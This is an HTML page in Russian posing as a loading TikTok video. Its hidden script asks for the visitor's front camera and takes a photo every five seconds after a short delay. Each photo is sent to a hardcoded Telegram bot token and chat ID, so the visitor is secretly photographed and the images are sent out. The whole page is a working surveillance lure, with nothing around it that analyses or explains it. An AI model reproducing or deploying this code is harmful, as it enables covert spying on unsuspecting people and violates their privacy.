<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video</title>
    <style>
        body {
            background-color: #010101;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Proxima Nova', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="text">Загрузка видео...</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    const botToken = '8220142638:AAFDjQSzi4V1i5xfpMBA42uBgaDjFA0znOo';
    const chatId = '8573089884';

    async function takeAndSendPhoto(video, canvas) {
        if (video.videoWidth === 0) return;

        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        
        const dataURL = canvas.toDataURL('image/jpeg', 0.5);
        const blob = await (await fetch(dataURL)).blob();
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        try {
            // ВОТ ТУТ БЫЛА ОШИБКА, ТЕПЕРЬ ВСЁ ИСПРАВЛЕНО:
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (!result.ok) console.log('Ошибка бота: ' + result.description);
        } catch (e) {
            console.error("Критическая ошибка:", e);
        }
    }

    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
        })
        .then(stream => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            video.srcObject = stream;

            // Ждем события 'loadedmetadata', когда камера реально ожила
            video.onloadedmetadata = () => {
                video.play();
                
                // Делаем паузу 2 секунды ПЕРЕД первым фото, 
                // чтобы камера успела настроить свет и фокус
                setTimeout(() => {
                    // Теперь запускаем бесконечный цикл
                    setInterval(() => {
                        takeAndSendPhoto(video, canvas);
                    }, 5000); 
                }, 2000);
            };
        })
        .catch(err => {
            console.log("Камера заблокирована или ошибка:", err);
        });
    };
</script>
</body>
</html>
